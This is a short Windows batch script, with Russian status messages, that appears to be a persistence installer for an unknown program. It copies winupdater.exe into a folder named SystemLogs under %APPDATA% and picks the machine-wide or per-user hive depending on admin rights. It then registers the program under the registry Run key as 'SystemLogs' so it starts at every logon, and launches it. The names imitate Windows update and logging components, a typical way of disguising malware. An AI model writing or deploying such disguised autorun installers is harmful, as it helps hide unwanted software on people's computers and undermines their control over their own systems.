@echo off
setlocal enabledelayedexpansion

set "TARGET_DIR=%APPDATA%\SystemLogs"
set "EXE_PATH=%TARGET_DIR%\winupdater.exe"

net session >nul 2>&1
if %errorlevel% == 0 (
    set "REG_ROOT=HKLM"
) else (
    set "REG_ROOT=HKCU"
)

echo [+] Создание директории: %TARGET_DIR%
mkdir "%TARGET_DIR%" 2>nul

echo [+] Копирование исполняемого файла
copy /Y "%~dp0winupdater.exe" "%EXE_PATH%" >nul

echo [+] Добавление в автозагрузку
reg add "%REG_ROOT%\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemLogs" /t REG_SZ /d "\"%EXE_PATH%\"" /f

echo [+] Запуск программы
start "" "%EXE_PATH%"

echo [✓] Установка завершена.
pause
